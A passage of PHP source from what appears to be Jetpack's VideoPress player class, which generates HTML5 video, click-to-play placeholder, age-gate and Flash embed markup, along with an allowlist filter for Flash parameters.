		if ( ! isset( $this->options['freedom'] ) || $this->options['freedom'] === false ) {
			$mp4 = $this->video->videos->mp4->url;
			if ( ! empty( $mp4 ) )
				$html .= '<source src="' . esc_url( $mp4 ) . '" type="video/mp4; codecs=&quot;' . esc_attr( $this->video->videos->mp4->codecs ) . '&quot;" />';
			unset( $mp4 );
		}
		$ogg = $this->video->videos->ogv->url;
		if ( ! empty( $ogg ) )
			$html .= '<source src="' . esc_url( $ogg ) . '" type="video/ogg; codecs=&quot;' . esc_attr( $this->video->videos->ogv->codecs ) . '&quot;" />';
		unset( $ogg );

		$html .= '<div><img alt="';
		if ( isset( $this->video->title ) )
			$html .= esc_attr( $this->video->title );
		$html .= '" src="' . $thumbnail . '" width="' . $this->video->calculated_width . '" height="' . $this->video->calculated_height . '" /></div>';
		if ( isset( $this->options['freedom'] ) && $this->options['freedom'] === true )
			$html .= '<p class="robots-nocontent">' . sprintf( __( 'You do not have sufficient <a rel="nofollow" href="%s">freedom levels</a> to view this video. Support free software and upgrade.', 'jetpack' ), 'http://www.gnu.org/philosophy/free-sw.html' ) . '</p>';
		elseif ( isset( $this->video->title ) )
			$html .= '<p>' . esc_html( $this->video->title ) . '</p>';
		$html .= '</video>';
		return $html;
	}

	/**
	 * Click to play dynamic HTML5-capable player.
	 * The player displays a video preview section including poster frame, video title, play button and watermark on the original page load and calculates the playback capabilities of the browser. The video player is loaded when the visitor clicks on the video preview area.
	 * If Flash Player 10 or above is available the browser will display the Flash version of the video. If HTML5 video appears to be supported and the browser may be capable of MP4 (H.264, AAC) or OGV (Theora, Vorbis) playback the browser will display its native HTML5 player.
	 *
	 * @since 1.5
	 * @return string HTML markup
	 */
	private function html5_dynamic() {
		$video_placeholder_id = $this->video_container_id . '-placeholder';
		$age_gate_required = $this->age_gate_required();
		$width = absint( $this->video->calculated_width );
		$height = absint( $this->video->calculated_height );

		$html = '<div id="' . $video_placeholder_id . '" class="videopress-placeholder" style="';
		if ( $age_gate_required )
			$html .= "min-width:{$width}px;min-height:{$height}px";
		else
			$html .= "width:{$width}px;height:{$height}px";
		$html .= ';display:none;cursor:pointer !important;position:relative;';
		if ( isset( $this->video->skin ) && isset( $this->video->skin->background_color ) )
			$html .= 'background-color:' . esc_attr( $this->video->skin->background_color ) . ';';
		$html .= 'font-family: \'Helvetica Neue\',Arial,Helvetica,\'Nimbus Sans L\',sans-serif;font-weight:bold;font-size:18px">' . PHP_EOL;

		/**
		 * Do not display a poster frame, title, or any other content hints for mature content.
		 */
		if ( ! $age_gate_required ) {
			if ( ! empty( $this->video->title ) ) {
				$html .= '<div class="videopress-title" style="display:inline;position:absolute;margin:20px 20px 0 20px;padding:4px 8px;vertical-align:top;text-align:';
				if ( $this->video->text_direction === 'rtl' )
					$html .= 'right" dir="rtl"';
				else
					$html .= 'left" dir="ltr"';
				if ( isset( $this->video->language ) )
					$html .= ' lang="' . esc_attr( $this->video->language ) . '"';
				$html .= '><span style="padding:3px 0;line-height:1.5em;';
				if ( isset( $this->video->skin ) && isset( $this->video->skin->background_color ) ) {
					$html .= 'background-color:';
					if ( $this->video->skin->background_color === 'rgb(0,0,0)' )
						$html .= 'rgba(0,0,0,0.8)';
					else
						$html .= esc_attr( $this->video->skin->background_color );
					$html .= ';';
				}
				$html .= 'color:rgb(255,255,255)">' . esc_html( $this->video->title ) . '</span></div>';
			}
			$html .= '<img class="videopress-poster" alt="';
			if ( ! empty( $this->video->title ) )
				$html .= esc_attr( $this->video->title ) . '" title="' . esc_attr( sprintf( _x( 'Watch: %s', 'watch a video title', 'jetpack' ), $this->video->title ) );
			$html .= '" src="' . esc_url( $this->video->poster_frame_uri, array( 'http', 'https' ) ) . '" width="' . $width . '" height="' . $height . '" />' . PHP_EOL;

			//style a play button hovered over the poster frame
			$html .= '<div class="play-button"><span style="z-index:2;display:block;position:absolute;top:50%;left:50%;text-align:center;vertical-align:middle;color:rgb(255,255,255);opacity:0.9;margin:0 0 0 -0.45em;padding:0;line-height:0;font-size:500%;text-shadow:0 0 40px rgba(0,0,0,0.5)">&#9654;</span></div>' . PHP_EOL;

			// watermark
			if ( isset( $this->video->skin ) && isset( $this->video->skin->watermark ) ) {
				$html .= '<div style="position:relative;margin-top:-40px;height:25px;margin-bottom:35px;';
				if ( $this->video->text_direction === 'rtl' )
					$html .= 'margin-left:20px;text-align:left;';
				else
					$html .= 'margin-right:20px;text-align:right;';
				$html .= 'vertical-align:bottom;z-index:3">';
				$html .= '<img alt="" src="' . esc_url( $this->video->skin->watermark, array( 'http', 'https' ) ) . '" width="90" height="13" style="background-color:transparent;background-image:none;background-repeat:no-repeat;border:none;margin:0;padding:0"/>';
				$html .= '</div>' . PHP_EOL;
			}
		}

		$data = array(
			'blog' => absint( $this->video->blog_id ),
			'post' => absint( $this->video->post_id ),
			'duration'=> absint( $this->video->duration ),
			'poster' => esc_url_raw( $this->video->poster_frame_uri, array( 'http', 'https' ) ),
			'hd' => (bool) $this->options['hd']
		);
		if ( isset( $this->video->videos ) ) {
			if ( isset( $this->video->videos->mp4 ) && isset( $this->video->videos->mp4->url ) )
				$data['mp4'] = array( 'size' => $this->video->videos->mp4->format, 'uri' => esc_url_raw( $this->video->videos->mp4->url, array( 'http', 'https' ) ) );
			if ( isset( $this->video->videos->ogv ) && isset( $this->video->videos->ogv->url ) )
				$data['ogv'] = array( 'size' => 'std', 'uri' => esc_url_raw( $this->video->videos->ogv->url, array( 'http', 'https' ) ) );
		}
		$locale = array( 'dir' => $this->video->text_direction );
		if ( isset( $this->video->language ) )
			$locale['lang'] = $this->video->language;
		$data['locale'] = $locale;
		unset( $locale );

		$guid = $this->video->guid;
		$guid_js = json_encode( $guid );
		$html .= '<script type="text/javascript">' . PHP_EOL;
		$html .= 'jQuery(document).ready(function() {';

		$html .= 'if ( !jQuery.VideoPress.data[' . json_encode($guid) . '] ) { jQuery.VideoPress.data[' . json_encode($guid) . '] = new Array(); }' . PHP_EOL;
		$html .= 'jQuery.VideoPress.data[' . json_encode( $guid ) . '][' . self::$shown[ $guid ] . ']=' . json_encode($data) . ';' . PHP_EOL;
		unset( $data );

		$jq_container = json_encode( '#' . $this->video_container_id );
		$jq_placeholder = json_encode( '#' . $video_placeholder_id );
		$player_config = "{width:{$width},height:{$height},";
		if ( isset( $this->options['freedom'] ) && $this->options['freedom'] === true )
			$player_config .= 'freedom:"true",';
		$player_config .= 'container:jQuery(' . $jq_container . ')}';

		$html .= "jQuery({$jq_placeholder}).show(0,function(){jQuery.VideoPress.analytics.impression({$guid_js})});" . PHP_EOL;

		if ( $age_gate_required ) {
			$html .= 'if ( jQuery.VideoPress.support.flash() ) {' . PHP_EOL;
			/**
			 * @link http://code.google.com/p/swfobject/wiki/api#swfobject.embedSWF(swfUrlStr,_replaceElemIdStr,_widthStr,_height
			 */
			$html .= 'swfobject.embedSWF(' . implode( ',', array(
				'jQuery.VideoPress.video.flash.player_uri',
				json_encode( $this->video_container_id ),
				json_encode( $width ),
				json_encode( $height ),
				'jQuery.VideoPress.video.flash.min_version',
				'jQuery.VideoPress.video.flash.expressinstall', // attempt to upgrade the Flash player if less than min_version. requires a 310x137 container or larger but we will always try to include
				'{guid:' . $guid_js . '}', // FlashVars
				'jQuery.VideoPress.video.flash.params',
				'null', // no attributes
				'jQuery.VideoPress.video.flash.embedCallback' // error fallback
			) ) . ');';
			$html .= '} else {' . PHP_EOL;
			$html .= "if ( jQuery.VideoPress.video.prepare({$guid_js},{$player_config}," . self::$shown[ $guid ] . ') ) {' . PHP_EOL;
			$html .= 'if ( jQuery(' . $jq_container . ').data( "player" ) === "flash" ){jQuery.VideoPress.video.play(jQuery(' . json_encode('#' . $this->video_container_id) . '));}else{';
			$html .= 'jQuery(' . $jq_placeholder . ').html(' . json_encode( $this->html_age_date() ) . ');' . PHP_EOL;
			$html .= 'jQuery(' . json_encode( '#' . $video_placeholder_id . ' input[type=submit]' ) . ').one("click", function(event){jQuery.VideoPress.requirements.isSufficientAge(jQuery(' . $jq_container . '),' . absint( $this->video->age_rating ) . ')});' . PHP_EOL;
			$html .= '}}}' . PHP_EOL;
		} else {
			$html .= "if ( jQuery.VideoPress.video.prepare({$guid_js}, {$player_config}," . self::$shown[ $guid ] . ') ) {' . PHP_EOL;
			if ( isset( $this->options['autoplay'] ) && $this->options['autoplay'] === true )
				$html .= "jQuery.VideoPress.video.play(jQuery({$jq_container}));";
			else
				$html .= 'jQuery(' . $jq_placeholder .  ').one("click",function(){jQuery.VideoPress.video.play(jQuery(' . $jq_container . '))});';
			$html .= '}';

			// close the jQuery(document).ready() function
			$html .= '});';
		}
		$html .= '</script>' . PHP_EOL;
		$html .= '</div>' . PHP_EOL;

		/*
		 * JavaScript required
		 */
		$noun = __( 'this video', 'jetpack' );
		if ( ! $age_gate_required ) {
			$vid_type = '';
			if ( ( isset( $this->options['freedom'] ) && $this->options['freedom'] === true ) && ( isset( $this->video->videos->ogv ) && isset( $this->video->videos->ogv->url ) ) )
				$vid_type = 'ogv';
			elseif ( isset( $this->video->videos->mp4 ) && isset( $this->video->videos->mp4->url ) )
				$vid_type = 'mp4';
			elseif ( isset( $this->video->videos->ogv ) && isset( $this->video->videos->ogv->url ) )
				$vid_type = 'ogv';

			if ( $vid_type !== '' ) {
				$noun = '<a ';
				if ( isset( $this->video->language ) )
					$noun .= 'hreflang="' . esc_attr( $this->video->language ) . '" ';
				if ( $vid_type === 'mp4' )
					$noun .= 'type="video/mp4" href="' . esc_url( $this->video->videos->mp4->url, array( 'http', 'https' ) );
				elseif ( $vid_type === 'ogv' )
					$noun .= 'type="video/ogv" href="' . esc_url( $this->video->videos->ogv->url, array( 'http', 'https' ) );
				$noun .= '">';
				if ( isset( $this->video->title ) )
					$noun .= esc_html( $this->video->title );
				else
					$noun .= __( 'this video', 'jetpack' );
				$noun .= '</a>';
			} elseif ( ! empty( $this->title ) ) {
				$noun = esc_html( $this->title );
			}
			unset( $vid_type );
		}
		$html .= '<noscript><p>' . sprintf( _x( 'JavaScript required to play %s.', 'Play as in playback or view a movie', 'jetpack' ), $noun ) . '</p></noscript>';

		return $html;
	}

	/**
	 * Only allow legitimate Flash parameters and their values
	 *
	 * @since 1.2
	 * @link http://kb2.adobe.com/cps/127/tn_12701.html Flash object and embed attributes
	 * @link http://kb2.adobe.com/cps/133/tn_13331.html devicefont
	 * @link http://kb2.adobe.com/cps/164/tn_16494.html allowscriptaccess
	 * @link http://www.adobe.com/devnet/flashplayer/articles/full_screen_mode.html full screen mode
	 * @link http://livedocs.adobe.com/flash/9.0/main/wwhelp/wwhimpl/common/html/wwhelp.htm?context=LiveDocs_Parts&file=00001079.html allownetworking
	 * @param array $flash_params Flash parameters expressed in key-value form
	 * @return array validated Flash parameters
	 */
	public static function esc_flash_params( $flash_params ) {
		$allowed_params = array(
			'swliveconnect' => array('true', 'false'),
			'play' => array('true', 'false'),
			'loop' => array('true', 'false'),
			'menu' => array('true', 'false'),
			'quality' => array('low', 'autolow', 'autohigh', 'medium', 'high', 'best'),
			'scale' => array('default', 'noborder', 'exactfit', 'noscale'),
			'align' => array('l', 'r', 't'),
			'salign' => array('l', 'r', 't', 'tl', 'tr', 'bl', 'br'),
			'wmode' => array('window', 'opaque', 'transparent','direct','gpu'),
			'devicefont' => array('_sans', '_serif', '_typewriter'),
			'allowscriptaccess' => array('always', 'samedomain', 'never'),
			'allownetworking' => array('all','internal', 'none'),
			'seamlesstabbing' => array('true', 'false'),
			'allowfullscreen' => array('true', 'false'),
			'fullScreenAspectRatio' => array('portrait', 'landscape'),
			'base',
			'bgcolor',
			'flashvars'
		);

		$allowed_params_keys = array_keys( $allowed_params );

		$filtered_params = array();
		foreach( $flash_params as $param=>$value ) {
			if ( empty($param) || empty($value) )
				continue;
			$param = strtolower($param);
			if ( in_array($param, $allowed_params_keys) ) {
				if ( isset( $allowed_params[$param] ) && is_array( $allowed_params[$param] ) ) {
					$value = strtolower($value);
					if ( in_array( $value, $allowed_params[$param] ) )
						$filtered_params[$param] = $value;
				} else {
					$filtered_params[$param] = $value;
				}
			}
		}
		unset( $allowed_params_keys );

		/**
		 * Flash specifies sameDomain, not samedomain. change from lowercase value for preciseness
		 */
		if ( isset( $filtered_params['allowscriptaccess'] ) && $filtered_params['allowscriptaccess'] === 'samedomain' )
			$filtered_params['allowscriptaccess'] = 'sameDomain';

		return $filtered_params;
	}

	/**
	 * Filter Flash variables from the response, taking into consideration player options.
	 *
	 * @since 1.3
	 * @return array Flash variable key value pairs
	 */
	private function get_flash_variables() {
		if ( ! isset( $this->video->players->swf->vars ) )
			return array();

		$flashvars = (array) $this->video->players->swf->vars;
		if ( isset( $this->options['autoplay'] ) && $this->options['autoplay'] === true )
			$flashvars['autoPlay'] = 'true';
		return $flashvars;
	}

	/**
	 * Validate and filter Flash parameters
	 *
	 * @since 1.3
	 * @return array Flash parameters passed through key and value validation
	 */
	private function get_flash_parameters() {
		if ( ! isset( $this->video->players->swf->params ) )
			return array();
		else
			return self::esc_flash_params( apply_filters( 'video_flash_params', (array) $this->video->players->swf->params, 10, 1 ) );
	}

	/**
	 * Flash player markup in a HTML embed element.
	 *
	 * @since 1.1
	 * @link http://www.whatwg.org/specs/web-apps/current-work/multipage/the-iframe-element.html#the-embed-element embed element
	 * @link http://www.google.com/support/reader/bin/answer.py?answer=70664 Google Reader markup support
	 * @return string HTML markup. Embed element with no children
	 */
	private function flash_embed() {
		if ( ! isset( $this->video->players->swf ) || ! isset( $this->video->players->swf->url ) )
			return '';

		$embed = array(
			'id' => $this->video_id,
			'src' => esc_url_raw( $this->video->players->swf->url . '&' . http_build_query( $this->get_flash_variables(), null, '&' ) , array( 'http', 'https' ) ),
			'type' => 'application/x-shockwave-flash',
			'width' => $this->video->calculated_width,
			'height' => $this->video->calculated_height
		);
		if ( isset( $this->video->title ) )
			$embed['title'] = $this->video->title;
		$embed = array_merge( $embed, $this->get_flash_parameters() );

		$html = '<embed';
		foreach ( $embed as $attribute => $value ) {
			$html .= ' ' . esc_html( $attribute ) . '="' . esc_attr( $value ) . '"';
		}
		unset( $embed );
		$html .= '></embed>';
		return $html;
	}

	/**
	 * Double-baked Flash object markup for Internet Explorer and more standards-friendly consuming agents.
	 *
	 * @since 1.1
	 * @return HTML markup. Object and children.
	 */
	private function flash_object() {
		if ( ! isset( $this->video->players->swf ) || ! isset( $this->video->players->swf->url ) )
			return '';

		$thumbnail_html = '<img alt="';
		if ( isset( $this->video->title ) )
			$thumbnail_html .= esc_attr( $this->video->title );
		$thumbnail_html .= '" src="' . esc_url( $this->video->poster_frame_uri, array( 'http', 'https' ) ) . '" width="' . $this->video->calculated_width . '" height="' . $this->video->calculated_height . '" />';
		$flash_vars = esc_attr( http_build_query( $this->get_flash_variables(), null, '&' ) );
		$flash_params = '';
		foreach ( $this->get_flash_parameters() as $attribute => $value ) {
			$flash_params .= '<param name="' . esc_attr( $attribute ) . '" value="' . esc_attr( $value ) . '" />';
		}
		$flash_help = sprintf( __( 'This video requires <a rel="nofollow" href="%s">Adobe Flash</a> for playback.', 'jetpack' ), 'http://www.adobe.com/go/getflashplayer');
		$flash_player_url = esc_url( $this->video->players->swf->url, array( 'http', 'https' ) );
		$description = '';
		if ( isset( $this->video->title ) ) {
			$standby = $this->video->title;
			$description = '<p><strong>' . esc_html( $this->video->title ) . '</strong></p>';
		} else {
			$standby = __( 'Loading video...', 'jetpack' );
		}
		$standby = ' standby="' . esc_attr( $standby ) . '"';
		return <<<OBJECT
<script type="text/javascript">if(typeof swfobject!=="undefined"){swfobject.registerObject("{$this->video_id}", "{$this->video->players->swf->version}");}</script>
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="{$this->video->calculated_width}" height="{$this->video->calculated_height}" id="{$this->video_id}"{$standby}>
	<param name="movie" value="{$flash_player_url}" />
	{$flash_params}
	<param name="flashvars" value="{$flash_vars}" />
	<!--[if !IE]>-->
	<object type="application/x-shockwave-flash" data="{$flash_player_url}" width="{$this->video->calculated_width}" height="{$this->video->calculated_height}"{$standby}>
		{$flash_params}
		<param name="flashvars" value="{$flash_vars}" />
	<!--<![endif]-->
	{$thumbnail_html}{$description}<p class="robots-nocontent">{$flash_help}</p>
	<!--[if !IE]>-->
	</object>
	<!--<![endif]-->
</object>
OBJECT;
	}
}